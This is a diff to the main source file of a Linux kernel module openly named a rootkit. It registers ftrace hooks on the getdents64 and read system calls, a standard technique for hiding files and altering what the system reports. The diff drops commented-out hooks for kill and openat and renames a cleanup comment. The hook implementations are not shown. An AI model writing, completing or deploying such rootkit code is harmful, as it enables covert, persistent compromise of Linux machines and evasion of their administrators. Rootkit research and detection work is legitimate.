@@ -1,18 +1,14 @@
 
 #include <linux/module.h>
 #include <linux/init.h>
-#include <linux/version.h> // TODO ADD VERSION
 #include <linux/kobject.h>
 
+#include "utils/ftrace_utils.h"
 #include "hooks/x64_sys_getdents.h"
-#include "hooks/x64_sys_kill.h"
 #include "hooks/x64_sys_read.h"
-//#include "hooks/x64_sys_openat.h"
 
 // define which functions to hook
 static struct ftrace_hook hooks[] = {
- //   HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-//        HOOK("__x64_sys_openat", hook_openat, &orig_openat),
         HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
         HOOK("__x64_sys_read", hook_read, &orig_read),
 };
@@ -33,7 +29,7 @@ static int __init rootkit_init(void) {
 }
 
 
-// Module cleanup: Restore original syscall pointer
+// cleanup: restore original syscall pointer
 static void __exit rootkit_exit(void) {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     pr_info("reached rootkit_exit.\n");
